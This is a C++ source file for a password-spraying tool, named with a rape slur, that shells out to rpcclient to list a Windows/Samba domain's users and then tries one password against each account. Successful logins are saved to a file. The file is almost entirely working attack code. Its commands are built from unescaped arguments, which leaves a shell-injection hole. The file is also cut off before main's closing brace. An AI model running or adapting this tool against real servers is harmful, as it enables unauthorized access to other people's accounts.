#include <iostream>
#include <cstring>
#include <fstream>
#include <regex>
#include <vector>

std::vector<std::string> users;
std::vector<std::string> hits;
void Help(){
    std::cout << "Usage:\n" << std::endl;
    std::cout << "enumurate\t\t-e \t\t\tRapeC -e <Username> <Password> <Server IP> " << std::endl;
    std::cout << "search   \t\t-s \t\t\tRapeC -s  <Password> <Server IP> " << std::endl;
}
int EnumurateUsers(char* user, char* pass, char* ip){
    std::ofstream userfile("users.txt");
    std::ifstream readufile("users.txt");
    std::ofstream plainusers("userlist.txt");
    int numusers = 0;
    if (!userfile.is_open()){
        std::cerr << "Error creating user file " << std::endl;
        exit(-2);
    }
    const char* pIcommand = "rpcclient -U='";
    const char* pIIcommand = "'%'";
    const char* pIIIcommand ="' -c enumdomusers  ";
    const char* pIVcommand = " > users.txt";
    char enumcommand[256];
    strncpy(enumcommand, pIcommand, sizeof(enumcommand));
    strncat(enumcommand, user, sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIIcommand, sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pass , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIIIcommand, sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, ip , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIVcommand , sizeof(enumcommand) - strlen(enumcommand) - 1);
    if (system(enumcommand) != 0){
        std::cerr << "Error running enumuration commnand " << std::endl;
        exit(-2);
    }
    std::regex pattern(R"(\[([^\]]+)\])");
    if (userfile.is_open()){
        std::string line;
        while (getline(readufile, line)){
            std::smatch match;
            numusers++;
            if (std::regex_search(line, match, pattern)){
                std::string username = match[1];
                plainusers << username << "\n";
            }
        }
    }
    plainusers.close();
    readufile.close();
    userfile.close();
    return numusers;
}
int TryPass(std::string user, char* pass, char* ip, std::ofstream& hitsfile, std::vector<std::string>& hits){
    const char* pIcommand = "rpcclient -U='";
    const char* pIIcommand = "'%'";
    const char* pIIIcommand = "' -c getusername ";
    const char* pIVcommand = " > /dev/null 2>&1";
    char enumcommand[256];
    strncpy(enumcommand, pIcommand, sizeof(enumcommand));
    strncat(enumcommand, user.c_str() , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIIcommand, sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pass , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIIIcommand , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, ip , sizeof(enumcommand) - strlen(enumcommand) - 1);
    strncat(enumcommand, pIVcommand , sizeof(enumcommand) - strlen(enumcommand) - 1);
    if (system(enumcommand) != 0){
        std::cout << "x " << user << " wrong password!" << std::endl;
    } else {
        std::cout << "[+] " << user << " correct password!" << std::endl;
        hitsfile << user << "\n";
        hits.push_back(user);
    }
    return 0;
}
int main(int argc, char* argv[]){
    if (strcmp(argv[1], "-e") == 0){
        int numusers = EnumurateUsers(argv[2], argv[3], argv[4]);
        std::cout << "[+] Enumeration succesfull, " << numusers << " Users found and stored at users.txt." << std::endl;
        exit(0);
    }
    if (strcmp(argv[1], "-s") == 0){
        std::string line;
        std::ifstream userfile("userlist.txt");
        std::ofstream hitfile("valunables.txt");
        if (userfile.is_open()){
            while (getline(userfile, line)){
                users.push_back(line);
            }
        }
        userfile.close();
        if (!hitfile.is_open()){
            std::cerr << "Cant write output file" << std::endl;
            exit(-4);
        }
        for (const std::string& user : users){
            TryPass(user, argv[2], argv[3], hitfile, hits);
        }
        hitfile.close();
        std::cout << "these users have been logged into succesfully: " << std::endl;
        for (const std::string& user : hits){
        std::cout << user << std::endl;
        }
    }

    return 0;
